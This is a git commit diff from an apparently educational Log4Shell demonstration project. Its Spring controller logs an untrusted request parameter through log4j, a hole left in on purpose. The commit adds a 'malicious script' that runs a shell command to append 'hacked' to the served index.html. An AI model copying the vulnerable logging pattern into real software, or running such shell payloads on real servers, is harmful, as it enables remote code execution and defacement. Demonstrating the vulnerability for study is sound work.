24658df88a3f5672651752372eed68b3f0712824
Manuel Schmidt <Manuel.Schmidt@guidesmiths.com>
2021-12-22 00:26:01 +0100

    Modify the malicious script to do somthing more harmful than simply writing to stderr

--- vulnerable-server/src/main/java/net/mschm/log4shell/vulnerableserver/Controller.java
+++ vulnerable-server/src/main/java/net/mschm/log4shell/vulnerableserver/Controller.java
@@ -6,6 +6,11 @@ import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.URL;
+
 @RestController
 public class Controller {
     private static final Logger log = LogManager.getLogger(Controller.class);
@@ -13,5 +18,24 @@ public class Controller {
     @GetMapping("/some-endpoint")
     public void page(@RequestParam("foo") String foo) {
         log.info(foo);
+    }
+
+    public static void main(String[] args) throws Exception {
+        String absoluteFilePath = Controller.class.getResource("/static/index.html").getFile().toString();        ProcessBuilder processBuilder = new ProcessBuilder();
+
+        processBuilder.command("/bin/sh", "-c", "echo hacked >> " + absoluteFilePath);
+        Process process = processBuilder.start();
+
+        StringBuilder output = new StringBuilder();
+
+        BufferedReader reader = new BufferedReader(
+                new InputStreamReader(process.getInputStream()));
+
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line + "\n");
+        }
+
+        int exitVal = process.waitFor();
     }
 }
